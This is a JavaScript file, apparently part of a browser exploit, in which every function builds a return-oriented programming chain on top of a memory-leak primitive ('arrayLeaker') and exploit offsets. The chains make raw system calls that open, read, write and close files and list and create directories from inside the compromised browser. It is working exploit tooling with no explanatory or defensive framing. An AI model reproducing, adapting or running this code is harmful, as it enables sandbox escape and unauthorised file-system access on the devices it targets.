function open(strpath) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("path", Util.ascii(strpath))
		.addDataInt32("errno")
		.addDataInt32("fd")
		.syscall(0x321, "path", 0o102, "fd", 0o600)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	var fd = chain.getDataInt32("fd");
	
	return { errno: errno, fd: fd };
}

function read(fd, size) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataBuffer("buffer", size)
		.addDataInt32("errno")
		.addDataInt64("read")
		.syscall(0x322, fd, "buffer", size, "read")
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	var read = chain.getDataInt64("read");
	var buffer = chain.getDataBuffer("buffer", read.low);
	
	return { errno: errno, read: read, buffer: buffer };
}

function write(fd, buffer, size) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("buffer", buffer)
		.addDataInt32("errno")
		.addDataInt64("written")
		.syscall(0x323, fd, "buffer", size, "written")
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	var written = chain.getDataInt64("written");
	
	return { errno: errno, written: written.low };
}

function close(fd) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataInt32("errno")
		.syscall(0x324, fd)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	
	return { errno: errno };
}

function opendir(strpath) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("path", Util.ascii(strpath))
		.addDataInt32("errno")
		.addDataInt32("fd")
		.syscall(0x325, "path", "fd")
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	var fd = chain.getDataInt32("fd");
	
	return { errno: errno, fd: fd };
}

function readdir(fd) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataInt32("errno")
		.addDataBuffer("dir", 258)
		.addDataInt64("read")
		.syscall(0x326, fd, "dir", "read")
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	var type = 0;
	var name = "";
	
	if (errno === 0) {
		var read = chain.getDataInt64("read");
		if (read.low > 0) {
			var dir = chain.getDataBuffer("dir", read.low);
			var typeAndLength = Util.getint16(dir);
			type = typeAndLength >> 8;
			var length = typeAndLength & 0xff;
			var name = Util.getascii(dir, 2, length);
		}
	}
	
	return { errno: errno, type: type, name: name };
}

function closedir(fd) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataInt32("errno")
		.syscall(0x327, fd)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	
	return { errno: errno };
}

function mkdir(strpath) {
	var chain = new ChainBuilder(offsets, addrGtemp)
		.addDataStr("path", Util.ascii(strpath))
		.addDataInt32("errno")
		.syscall(0x32B, "path", 0o700)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker).execute();
	
	var errno = chain.getDataInt32("errno");
	
	return { errno: errno };
}